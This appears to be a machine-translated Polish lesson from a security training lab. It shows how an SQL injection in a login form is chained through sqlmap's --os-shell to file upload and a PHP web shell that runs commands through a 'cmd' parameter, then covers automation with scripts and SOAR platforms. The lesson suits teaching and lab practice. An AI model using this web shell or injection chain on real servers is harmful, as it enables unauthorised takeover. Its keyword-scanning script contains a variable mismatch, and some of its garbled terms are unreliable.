Należy zauważyć, że łączenie exploitów w łańcuchy może być bardzo skuteczną techniką dla atakujących, ponieważ pozwala im ominąć wiele warstw zabezpieczeń i uzyskać dostęp do poufnych informacji i zasobów. Dlatego organizacje muszą stale aktualizować i aktualizować swoje systemy oraz wdrażać odpowiednie zabezpieczenia sieciowe.segmentacjai najlepszych praktyk bezpieczeństwa, aby zminimalizować ryzyko takich ataków.

Aby zademonstrować proces **„łączenia łańcuchów eksploatacji w celu opracowania kompletnegoRCEZdalne wykonanie kodu (RCE) „łańcuch”** , przeanalizujmy sytuację z życia wziętą. Ćwiczenie koncentruje się bardziej na tym, jak łączyć luki w zabezpieczeniach, niż **na tym, jak je wykorzystać** .

Łączenie się z maszyną

Podczas tego zadania będziemy używać systemu Windows Server jako maszyny testowej wraz z podatną na ataki aplikacją internetową. Maszynę wirtualną można uruchomić, klikając przycisk `Start Machine`. Po uruchomieniu systemu należy odczekać 2-3 minuty, aby upewnić się, że został on poprawnie uruchomiony. Kliknij `Start AttackBox`przycisk w prawym górnym rogu strony; będziemy potrzebować programu sqlmap, który jest preinstalowany na urządzeniu AttackBox.

Jak połączyć wiele exploitów

Korzystając ze studium przypadku, przyjrzyjmy się bliżej różnym fazom łączenia exploitów. Procedura instalacji i podstawowe polecenia nie są tu omówione, ponieważ celem tego badania jest łączenie exploitów w celu stworzenia kompletnego łańcucha RCE.  

- Załóżmy, że Bob jest inżynierem bezpieczeństwa w **ChatAI**  i otrzymał zadanie wykorzystania luk w zabezpieczeniach aplikacji internetowej hostowanej w systemie `http://MACHINE_IP/ai`. Zgodnie ze wstępną oceną zespołu testów penetracyjnych, niektóre z luk w zabezpieczeniach aplikacji internetowej to ataki typu SQL injection i przesyłanie dowolnych plików. Celem jest połączenie tych luk w celu zdalnego wykonania kodu. Pierwszym i najważniejszym krokiem w wykorzystaniu systemu docelowego jest znalezienie i wykorzystanie luki w zabezpieczeniach, która stanowi punkt wejścia.
- W przypadku aplikacji internetowych, takie punkty wejścia są zazwyczaj pozyskiwane poprzez **wstrzyknięcie kodu SQL** , co prowadzi do przesłania dowolnego pliku, a następnie zdalnego wykonania kodu lub przejęcia kontroli nad maszyną. Najprostszym sposobem sprawdzenia pod kątem wstrzyknięcia kodu SQL jest użycie znaków specjalnych. Więcej informacji na temat wstrzyknięcia kodu SQL można znaleźć  [tutaj](https://tryhackme.com/room/sqlinjectionlm) . Po odwiedzeniu panelu logowania  **ChatAI**`http://MACHINE_IP/ai/login.php` pod adresem [link widoczny dla zalogowanych] Bob natknął się na pola wprowadzania danych z prośbą o podanie adresu e-mail i hasła. 

![Formularz logowania do aplikacji internetowej](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c10ae7f395dcc50b72d71ca5a2e7adb9.png)

- Najpierw próbował wpisać prawidłowy adres e-mail, a następnie e-mail ze znakami specjalnymi, aby sprawdzić, czy aplikacja internetowa wyśle ​​inną odpowiedź. Bob otrzymał inną odpowiedź po wpisaniu prawidłowego adresu e-mail użytkownika `test@chatai.com`niż po wpisaniu nieprawidłowego adresu  `test@chatai.com'`. Zwróć uwagę na znak specjalny `'`na końcu nieprawidłowego adresu e-mail.
- Odkrył, że aplikacja jest prawdopodobnie podatna na ataki typu SQL injection i teraz zamierza wykorzystać tę lukę, aby uzyskać RCE. W tym celu Bob użył sqlmap , narzędzia do automatycznego wyszukiwania i wykorzystywania luk w zabezpieczeniach typu SQL injection we wszystkich głównych bazach danych. Więcej informacji o tym narzędziu można znaleźć [tutaj](https://tryhackme.com/room/sqlmap) .
- Jak wiemy, sqlmap wymaga punktu końcowego, aby wykorzystać lukę w zabezpieczeniach SQL injection. Bob uzyskał dostęp do punktu końcowego, przechwytując wywołania. Możesz sprawdzić wywołania `Right click on the web page > select Inspect > click on the Network tab`(proces może się nieznacznie różnić w zależności od przeglądarki). Możesz również przechwycić ruch za pomocą znanego narzędzia [Burp Suite](https://tryhackme.com/room/burpsuitebasics) .

![Karta Sieć w konsoli programisty, aby sprawdzić adres URL żądania](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e0e582e78270e7a758d807821d2a6686.png)

_Kliknij, aby powiększyć obraz._

- Teraz, gdy ma już punkt końcowy, czas go wykorzystaćmapa sqlmapBob skopiował przechwycony adres URL `http://MACHINE_IP/ai/includes/user_login.php?email=test%40chatai.com&password=123`, otworzył terminal i wykonał następujące polecenie ( **Uwaga** : Enter, `Y` jeśli zostaniesz o to poproszony i `4` określ PHP jako obsługiwany język serwera WWW): 

AttackBox - Terminal

```shell-session
thm@machine$ sqlmap -u "http://MACHINE_IP/ai/includes/user_login.php?email=test%40chatai.com&password=123" -p email --os-shell

[00:43:50] [INFO] testing connection to the target URL
[00:43:50] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:43:50] [INFO] testing if the target URL content is stable
[00:43:51] [INFO] target URL content is stable
[00:43:51] [WARNING] heuristic (basic) test shows that GET parameter 'email' might not be injectable
[00:43:51] [INFO] testing for SQL injection on GET parameter 'email'
[00:43:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:43:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[00:43:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:44:12] [INFO] GET parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[00:44:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:44:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
sqlmap identified the following injection point(s) with a total of 124 HTTP(s) requests:
---
Parameter: email (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: email=test@chatai.com' AND SLEEP(5) AND 'cSIT'='cSIT&password=123
---
[00:46:12] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12
[00:46:12] [INFO] going to use a web backdoor for command prompt
[00:46:12] [INFO] fingerprinting the back-end DBMS operating system
[00:46:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[00:46:27] [INFO] the back-end DBMS operating system is Windows
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[00:46:29] [INFO] retrieved the web server document root: 'C:\xampp\htdocs'
[00:46:29] [INFO] retrieved web server absolute paths: 'C:/xampp/htdocs/ai/includes/functions.php, C:/xampp/htdocs/ai/includes/user_login.php'
[00:46:29] [INFO] trying to upload the file stager on 'C:/xampp/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[00:46:29] [INFO] the file stager has been successfully uploaded on 'C:/xampp/htdocs/' - http://MACHINE_IP:80/tmpukmfp.php
[00:46:29] [INFO] the backdoor has been successfully uploaded on 'C:/xampp/htdocs/' -http://MACHINE_IP:80/tmpbpljk.php
[00:46:29] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami

```

- Powyższe polecenie wykorzystaSQLpodatności na wstrzyknięcie szkodliwego oprogramowania, a także powiązanie jej z próbą przesłania dowolnego pliku, która powoduje przesłanie pliku w głównym katalogu internetowym, do którego można uzyskać dostęp, wpisując adres `http://MACHINE_IP:80/tmpukmfp.php`w przeglądarce.  

![strona przesyłania plików sqlmap](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0cdb119c2ab42d3ce2abd53129e04833.png)  

- Szkodliwy plik pozwala Bobowi uzyskać wstępny dostęp do serwera. Teraz Bob otwiera przed nim możliwości wykorzystania, ponieważ może przesłać dowolny plik na serwer i go uruchomić. Tworzy prostyPHPbackdoor, który pozwoli mu uruchomić dowolne polecenie na serwerze za pomocą `cmd`parametru. Utwórz plik tekstowy, kopiując poniższy kod i zapisując go jako `hack.php`.

siekać.php

```shell-session

<?php
if(isset($_REQUEST['cmd']))
{
	echo "<pre>"; $cmd = ($_REQUEST['cmd']);
	system ($cmd);
	echo "</pre>";
	die;
}
?>
```

- Teraz Bob może przesłać powłokę za pomocą przeglądarki i uzyskać dostęp do tylnego wejścia pod adresem `http://MACHINE_IP:80/hack.php`.

![Powłoka internetowa po wykonaniu polecenia dir](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5d7f22f3550f2d3797c2ebaf2dc9e882.png)  

Powyższe studium przypadku pokazuje, jak prosta podatność, taka jak początkowaSQLAtak typu injection można przeprowadzić w serii ataków, które mogą doprowadzić do przesłania dowolnego pliku i ostatecznie zdalnego wykonania kodu.

Widziałeś, jak atakujący mogą łączyć wiele luk w zabezpieczeniach, aby wykorzystać system. Teraz zobaczysz, jak automatyzacja może pomóc inżynierom bezpieczeństwa poprawić ogólną postawę bezpieczeństwa organizacji. Bez automatyzacji zadania mogą być czasochłonne i podatne na błędy ludzkie. Jednak automatyzacja procesów pomaga inżynierom bezpieczeństwa skuteczniej identyfikować i usuwać luki w zabezpieczeniach, zmniejszając ryzyko udanego cyberataku na sieć organizacji. Kilka sposobów automatyzacji tych zadań obejmuje skrypty, narzędzia do planowania oraz platformy oferujące koordynację bezpieczeństwa, automatyzację i reagowanie (SZYBOWAĆ) możliwości.

- **Skrypty** : Jednym ze sposobów automatyzacji codziennych zadań i kontroli bezpieczeństwa jest użycie skryptów. Języki skryptowe, takie jak Python, PowerShelli Bash mogą automatyzować wiele zadań, w tym administrację systemem, kontrole bezpieczeństwa i analizę danych. Skrypty mogą automatyzować powtarzalne zadania, takie jak skanowanie w poszukiwaniu luk w zabezpieczeniach, monitorowanie ruchu sieciowego i zbieranie danych z logów. Ponadto skrypty mogą być używane do wykonywania złożonych zadań, takich jak automatyzacja procedur reagowania na incydenty i analiza dużych zbiorów danych. Na przykład, możesz utworzyć mały skrypt wPHPaby przejrzeć pliki dziennika i zidentyfikować wszelkie złośliwe adresy URL lub słowa kluczowe:
    
    znajdźSłowaKluczowe.php
    
    ```shell-session
    
    <?php
    
    $malicious_keywords = array('shell', 'apt', 'sql_error', 'hack'); // list of bad words
    
    $path = 'error_log.txt'; //path to the file

    $file = fopen($path, 'r'); //open file

    while(!feof($file)) {
      $line = fgets($file);
      
      foreach($keywords as $keyword) {
        if(strpos($line, $keyword) !== false) { //match the keyword
          echo "The malicious keyword '$keyword' was found in the file.\n";
        }
      }
    }
    fclose($file);
    
    ?>
    
    ```
    
- **Narzędzia do planowania** : Narzędzia do planowania to kolejny sposób automatyzacji typowych zadań i kontroli bezpieczeństwa. Narzędzia do planowania, takie jak zadania cron i Harmonogram zadań systemu Windows, mogą być używane do planowania uruchamiania skryptów w określonych godzinach. Pozwala to organizacjom zautomatyzować skanowanie w poszukiwaniu luk w zabezpieczeniach, tworzenie kopii zapasowych i aktualizacje oprogramowania. Na przykład, inżynier ds. bezpieczeństwa może skorzystać z narzędzia do skanowania luk w zabezpieczeniach, które automatyzuje identyfikację i analizę luk w zabezpieczeniach w sieci organizacji. Narzędzie może **regularnie skanować sieć, wykrywając luki w zabezpieczeniach** , które mogły pojawić się od ostatniego skanowania. Następnie narzędzie może generować raporty dotyczące wykrytych luk w zabezpieczeniach, kategoryzując je według wagi i proponując zalecane działania naprawcze. 
- **SZYBOWAĆPlatformy** : Trzecim sposobem na automatyzację codziennych zadań i kontroli bezpieczeństwa jest wykorzystanie platform koordynacji, automatyzacji i reagowania na zagrożenia. Platformy te zapewniają scentralizowany interfejs zarządzania do automatyzacji i koordynacji zadań bezpieczeństwa. Mogą one automatyzować reagowanie na incydenty, wyszukiwanie zagrożeń i zarządzanie incydentami. Dodatkowo, można je wykorzystać do integracji z innymi narzędziami bezpieczeństwa, takimi jak zapory sieciowe, systemy wykrywania włamań (ISD) oraz systemy zarządzania **informacjami** **i** zdarzeniami bezpieczeństwa **(** **ISM** ).SIEM) systemy. [Shuffler.io(otwiera się w nowej karcie)](https://shuffler.io/)I[Splunk](https://tryhackme.com/room/splunk101) to kilka z tych znanych[SZYBOWAĆ](https://tryhackme.com/room/soar) Platformy, które możesz odkrywać.

Podczas automatyzowania zadań i kontroli bezpieczeństwa ważne jest uwzględnienie następujących najlepszych praktyk:

- Przetestuj swoje skrypty i narzędzia automatyzacji w kontrolowanym środowisku przed ich wdrożeniem w środowisku produkcyjnym.
- Upewnij się, że Twoje skrypty i narzędzia automatyzacji są dobrze udokumentowane i łatwe do zrozumienia.
- Korzystaj z rejestrowania i monitorowania, aby śledzić zautomatyzowane zadania.
- Regularnie sprawdzaj procedury automatyzacji i kontroli bezpieczeństwa, aby mieć pewność, że nadal są praktyczne i istotne.
- Aktualizuj i poprawiaj swoje skrypty i narzędzia automatyzacji, aby wyeliminować wszelkie luki w zabezpieczeniach.

Podsumowując, automatyzacja typowych zadań i kontroli bezpieczeństwa może pomóc organizacjom usprawnić działanie i poprawić ogólną sytuację bezpieczeństwa. Wdrażając automatyzację, należy wziąć pod uwagę najlepsze praktyki, takie jak testowanie, dokumentowanie, rejestrowanie i monitorowanie, regularne przeglądy oraz aktualizacje zabezpieczeń.

W tej sali dowiedzieliśmy się o cyklu życia podatności, o tym, jak powstają exploity, oraz jak łączyć wiele luk w celu uzyskania pełnej kontroli nad systemem. Ponadto, krótko omówiliśmy, jak można zautomatyzować rutynowe zadania, aby wspomóc inżyniera bezpieczeństwa.  

Podsumowując, tworzenie exploitów opartych na istniejących lukach to złożony proces obejmujący ich wykrywanie, badania, opracowywanie, testowanie i wdrażanie. Należy jednak zachować szczególną ostrożność w przypadku luk i exploitów, a wszystkie testy powinny być przeprowadzane w odizolowanym środowisku, aby uniknąć zainfekowania własnego systemu.
